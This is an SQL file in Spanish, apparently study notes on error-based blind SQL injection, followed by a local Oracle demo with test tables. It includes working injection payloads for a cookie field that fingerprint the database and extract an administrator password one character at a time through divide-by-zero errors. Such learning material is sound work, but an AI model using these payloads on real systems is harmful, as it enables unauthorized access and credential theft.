/*
Inyección SQL basada en errores

La inyección SQL basada en errores se refiere a casos donde puedes usar mensajes de error para extraer
o inferir datos sensibles de la base de datos, incluso en contextos ciegos.
Las posibilidades dependen de la configuración de la base de datos y los tipos de errores que puedes desencadenar:

Puedes inducir a la aplicación a devolver una respuesta de error específica basada en el resultado
de una expresión booleana. Puedes explotar esto de la misma manera que las respuestas condicionales que vimos en la sección anterior.
Para más información, consulta Explotación de inyección SQL ciega mediante errores condicionales.

Puedes desencadenar mensajes de error que muestren los datos devueltos por la consulta.
Esto convierte efectivamente vulnerabilidades de inyección SQL ciega en visibles.
Para más información, consulta Extracción de datos sensibles a través de mensajes de error SQL detallados.



Explotación de inyección SQL ciega mediante errores condicionales

Algunas aplicaciones realizan consultas SQL pero su comportamiento no cambia, independientemente
de si la consulta devuelve algún dato. La técnica de la sección anterior no funcionará,
porque inyectar diferentes condiciones booleanas no hace ninguna diferencia en las respuestas de la aplicación.

A menudo es posible inducir a la aplicación a devolver una respuesta diferente dependiendo de si ocurre un error SQL.
Puedes modificar la consulta para que cause un error en la base de datos solo si la condición es verdadera. Muy a menudo,
un error no manejado lanzado por la base de datos causa alguna diferencia en la respuesta de la aplicación,
como un mensaje de error. Esto te permite inferir la veracidad de la condición inyectada.


Para saber si la BD es SQL o Oracle, debemos hacer:
xyz' || (SELECT '') || '
xyz' || (SELECT '' FROM DUAL) || '

Y validar si la tabla existe:
xyz' || (SELECT '' FROM users LIMIT 1) || '
O en Oracle
xyz' || (SELECT '' FROM users WHERE ROWNUM = 1) || ' 


Para ver cómo funciona esto, supongamos que se envían dos solicitudes que contienen los siguientes valores de cookie TrackingId a su vez:

xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a --> falla por la operacion matematica 1/0

Para Oracle seria:
xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a --> falla por la operacion matematica 1/0

Estos inputs usan la palabra clave CASE para probar una condición y devolver una expresión diferente dependiendo de si la expresión es verdadera:

Con el primer input, la expresión CASE evalúa a 'a', lo que no causa ningún error.
Con el segundo input, evalúa a 1/0, lo que causa un error de división por cero.
Si el error causa una diferencia en la respuesta HTTP de la aplicación, puedes usar esto para determinar si la condición inyectada es verdadera.

Usando esta técnica, puedes recuperar datos probando un carácter a la vez:
xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM users)='a

Incluso, podemos verificar el largo del password:
xyz' AND (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 1) THEN 1/0 ELSE 'a' END FROM users)='a

y en Oracle primero validar si existe el user:
xyz' AND (SELECT CASE WHEN (username = 'administrator' AND 1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a

Y luego:
xyz' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE ROWNUM = 1)='a

Nota: Hay diferentes maneras de desencadenar errores condicionales, y diferentes técnicas funcionan mejor en diferentes tipos de bases de datos.
Para más detalles, consulta la hoja de trucos de inyección SQL.
*/


-- para DB Oracle:
CREATE TABLE EMPLOYEE (
  empId NUMBER PRIMARY KEY,
  name VARCHAR2(15) NOT NULL,
  dept VARCHAR2(10) NOT NULL
);

CREATE TABLE users (
  empId NUMBER PRIMARY KEY,
  username VARCHAR2(15) NOT NULL,
  password VARCHAR2(10) NOT NULL
);

-- insert
INSERT INTO EMPLOYEE VALUES (1, 'Clark', 'Sales');
INSERT INTO EMPLOYEE VALUES (2, 'Dave', 'Accounting');
INSERT INTO EMPLOYEE VALUES (3, 'Ava', 'Sales');

INSERT INTO users VALUES (1, 'administrator', 'pepe');

-- fetch 
SELECT * FROM EMPLOYEE WHERE dept = 'Sales' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) > 'w') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a'; -- esto no falla, porque p no es mayor que w

SELECT * FROM EMPLOYEE WHERE dept = 'Sales' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) > 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a'; -- esto si falla, porque p es mayor que a


